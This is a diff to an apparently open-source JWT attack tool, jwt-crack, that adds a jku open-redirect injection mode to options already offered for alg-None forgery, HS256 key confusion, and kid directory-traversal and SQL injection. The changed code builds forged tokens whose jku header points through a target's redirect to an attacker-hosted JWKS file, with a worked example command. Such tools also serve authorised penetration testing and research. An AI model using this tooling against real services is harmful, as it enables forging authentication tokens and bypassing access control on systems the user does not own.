@@ -16,6 +16,8 @@
    limitations under the License.
 """
 
+
+
 __version__ = "0.1"
 __author__ = "DontPanicO"
 
@@ -54,8 +56,8 @@ class Cracker:
     description = "A command line tool for cracking JWT"
 
     usage = """
-        Usage:
-        python3 jwt.py <token> [options]
+        python3 jwt-crack.py <token> [options] OR
+        jwtcrk <token> [options] IF YOU HAVE USED install.py
         
         Positional:
         token                     [Your JWT.]
@@ -71,17 +73,23 @@ class Cracker:
                                    its token, it will work.]
            --specify-key <string> [A string used as key.]
            --inject-kid <exploit> [Try to inject a payload in the kid header; dirtrv, sqli.]
-           --jku-basic <yourIP>   [Basic jku injection. jku attacks are complicated, you need
+           --jku-basic <yourURL>  [Basic jku injection. jku attacks are complicated, you need
                                    some config. You have to host the jwks.json crafted file on
                                    your pc or on a domain you have. Pass it to this parameter,
-                                   but don't force a path; jwks are a common path, pass only
+                                   but don't force a path; jwks have a common path, pass only
                                    the first part of the url, '/.well-known/jwks.json' will be
                                    automatically appended.]
+           --jku-redirect <mainURL,yourURl>
+                                  [Try to use an open redirect to make toe jku header point to
+                                   your url. To do this you need to specify the exact place in
+                                   the main url, where your url has to be attached. This is done
+                                   with the keyword HERE. Look at the examples for more details.
         
         Examples:
-        python3 jwt.py <token> --decode
-        python3 jwt.py <token> --alg None --payload <name:value>
-        python3 jwt.py <token> --alg HS256 --key <path_to_public.pem> --payload <name:value>
+        jwtcrk <token> --decode
+        jwtcrk <token> --alg None --payload <name:value>
+        jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <name:value>
+        jwtcrk <token> --alg rs256 --p <name:value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
         """
 
     command = [sys.argv[i] for i in range(len(sys.argv))]
@@ -92,7 +100,7 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, unverified=False, decode=False):
+    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, jku_redirect, unverified=False, decode=False):
         """
         :param token: The user input token -> String. Positional.
         :param alg: The algorithm for the attack. HS256 or None -> str. Optional.
@@ -121,10 +129,8 @@ class Cracker:
         self.auto_try = auto_try
         self.kid = kid
         self.specified_key = specified_key
-        if jku_basic is not None:
-            self.jku_basic = jku_basic.rstrip("/")
-        else:
-            self.jku_basic = jku_basic
+        self.jku_basic = jku_basic
+        self.jku_redirect = jku_redirect
         self.unverified = unverified
         self.decode = decode
         # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)
@@ -136,19 +142,21 @@ class Cracker:
     def validation(self):
         """
         Does some validation on; self.token, self.alg, self.path_to_key, self.auto_try, self.kid self.file and self.key.
+        This function is written in a terrible way, but it works. Since it has to handle so many different use cases
+        for me it's enough. If you want to make some restyle, without compromising it functionality, you're welcome.
 
         1)Validate the token: Using check_token, looks if the token is valid. If not quits out.
 
         2)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none it reminds
         to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 has
-        been passed as alg. Last but not least, if self.jku_basic is present, it force the alg to be RSA.
+        been passed as alg. Last but not least, if any jku argument is present, it force the alg to be RSA.
 
         3)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
         This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
         to the wright argument. First, if a jku argument has been passed, the scripts checks that no other key related one
-        has been passed too, and if it quits out. Else it generates a priv, pub pair with openssl and extrac the modulus and
-        the esponent. Since now, if the jku was passed, we know that not other args was, so the validation ends here. If it
-        goes on, it means that we have no jku arg, so we don't need to check for it later in the function. 
+        has been passed too, and if it quits out. Else it generates a priv pub pair with openssl and extracs the modulus and
+        the esponent. Since now, if any jku arg has been passed, we know that not other args has, so the validation ends here.
+        If it goes on, it means that we have no jku arg, so we don't need to check for it later in the function. 
         If an hostname for self.auto_try has been passed, it call get_key_from_ssl_cert and stores it in self.path_to_key.
         In this check, if we have self.kid the script quits, cause of the conflict (self.kid uses preset keys). Then if 
         we have self.path_to_key, it firsts checks that the path exists and that the alg is different from 'none' or 'None'.
@@ -175,18 +183,22 @@ class Cracker:
                 elif self.alg == "None" or "none":
                     print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                 elif self.alg == "rs256" or self.alg == "RS256":
-                    if self.jku_basic is None:
-                        print(f"{Bcolors.ERROR}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
+                    if self.jku_basic is None or self.jku_redirect is not None:
+                        print(f"{Bcolors.FAIL}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
                         sys.exit(1)
                     if self.alg == "rs256":
                         self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
-        if self.jku_basic is not None:
-            if self.alg is not None:
+        if self.jku_basic is not None or self.jku_redirect is not None:
+            if self.jku_basic is not None and self.jku_redirect is not None:
+                print(f"{Bcolors.FAIL}ERROR: You can't use two jku injections at the same time.{Bcolors.ENDC}")
+                sys.exit(1)
+            if self.alg is not None and self.alg != "RS256":
                 print(f"{Bcolors.WARNING}WARNING: With jku injections, alg will be forced to RS256.{Bcolors.ENDC}")
             self.alg = "RS256"
         """Validate key"""
-        if self.jku_basic is not None:
+        # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
+        if self.jku_basic is not None or self.jku_redirect is not None:
             other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key]
             """With jku, you can't use other key related args"""
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
@@ -249,7 +261,7 @@ class Cracker:
         parameters have been called along with -d itself.
 
         """
-        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic]
+        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect]
         if any(arg is not None for arg in other_args) or self.unverified:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
@@ -283,9 +295,17 @@ class Cracker:
             if header_dict['jku'] is None:
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                 sys.exit(2)
-            your_url = self.jku_basic + "/.well-known/jwks.json"
+            your_url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = your_url
+        elif self.jku_redirect:
+            if header_dict['jku'] is None:
+                print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
+                sys.exit(2)
+            main_url = self.jku_redirect.split(",")[0]
+            your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
+            self.jku_basic_attack(header_dict)
+            header_dict['jku'] = main_url.replace("HERE", your_url)
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
@@ -616,7 +636,11 @@ if __name__ == '__main__':
                         help="Specify a string to use as key", required=False
                         )
     parser.add_argument("--jku-basic",
-                        help="Specify your ip to host the jwks.json file",
+                        help="Specify your ip or domain to host the jwks.json file",
+                        required=False
+                        )
+    parser.add_argument("--jku-redirect",
+                        help="Specify the url with a redirect to the host where jwks.json file will be hosted",
                         required=False
                         )
 
@@ -625,7 +649,7 @@ if __name__ == '__main__':
 
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.auto_try,
-        args.inject_kid, args.specify_key, args.jku_basic, args.unverified, args.decode
+        args.inject_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.unverified, args.decode
     )
     # print(args)
     # print(cracker.key)
